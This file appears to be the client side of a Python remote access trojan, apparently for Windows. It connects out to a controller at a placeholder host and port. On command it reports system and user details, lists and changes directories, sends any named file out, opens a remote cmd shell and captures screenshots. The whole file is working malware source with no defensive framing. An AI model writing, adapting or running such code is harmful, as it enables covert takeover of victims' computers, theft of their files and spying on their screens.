import socket
import subprocess,platform,os,getpass,json,base64,time,pickle,gzip,pyautogui

def file_send(file_name):
     global target
     with open(file_name,"rb") as file:
            data = file.read()
            time.sleep(0.25)
            batch_num = len(data)//1024
            for i in range(batch_num):
                batch=data[i*1024:(i+1)*1024]
                target.send(batch)
            batch=data[batch_num*1024:]
            target.send(batch)
            time.sleep(1)
            target.send(("done").encode())
Host_ip = "HOST_IP"
Host_port = 5555
target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target.connect((Host_ip,Host_port))
#target.connect(("192.168.1.187",5555))
while True:
    recive = target.recv(1024).decode()
    if recive =="info":
        system_info = str(platform.uname())
        target.send(system_info.encode())
    elif recive =="cwd":
        cwd = os.getcwd()
        target.send(cwd.encode())
    elif recive =="ls":
        ls = str(os.listdir(os.getcwd()))
        target.send(ls.encode())
    elif "cd" in recive:
        try:
            os.chdir(recive.split("cd ")[1])
            perm="1"
            target.send(perm.encode())
        except:
            perm="0"
            target.send(perm.encode())
    elif recive=="user":
        user = getpass.getuser()
        target.send(user.encode())
    elif recive.split(" ")[0] =="get":
        print(recive.split("get ")[1])
        file_send(recive.split("get ")[1])
       
    elif recive=="shell":
        p = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            recive_cmd = target.recv(1024).decode()
            print(recive_cmd)
            if recive_cmd=="quit":
                print("break while loop")
                p.terminate()
                break
            else:
                p.stdin.write(recive_cmd.encode())
                p.stdin.write(b'\n')
                p.stdin.flush()

                output = p.stdout.readline().decode('cp1252')

                # Çıktıyı byte'a çevirme
                byte_data = pickle.dumps(output)
                
                # Byte veriyi gzip ile sıkıştırma
                compressed_data = gzip.compress(byte_data)
                
                target.send(compressed_data)
        
    elif recive=="screenshot":
        ss = pyautogui.screenshot()
        ss.save("temp.png")
        file_send("temp.png")
        os.remove("temp.png")
    elif recive=="q" or recive=="quit":
        target.close()
        break